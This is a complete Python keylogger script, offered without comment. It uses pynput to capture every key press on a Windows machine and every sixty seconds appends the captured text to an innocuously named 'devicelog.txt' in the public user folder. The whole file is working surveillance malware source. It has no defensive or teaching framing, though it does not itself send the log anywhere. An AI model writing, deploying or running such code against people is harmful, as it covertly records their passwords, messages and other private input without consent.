#!/usr/bin/env python
import pynput.keyboard
import threading
import os

class Keylogger:

    def __init__(self):
        self.log = ""
        self.path = os.environ['PUBLIC'] + '\\devicelog.txt'

    def appendlog(self, string):
        self.log = self.log + string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.backspace:
                current_key = " "
            elif key == key.enter:
                current_key = " "
            elif key == key.shift_r:
                current_key = " "
            elif key == key.shift:
                current_key = " "
            elif key == key.caps_lock:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.appendlog(current_key)

    def report(self):
        self.write_file(self.log)
        self.log = " "
        timer = threading.Timer(60, self.report)
        timer.start()

    def write_file(self, keys):
        with open(self.path, 'a') as f:
            f.write(keys)

    def keystart(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

keylogs = Keylogger()
keylogs.keystart()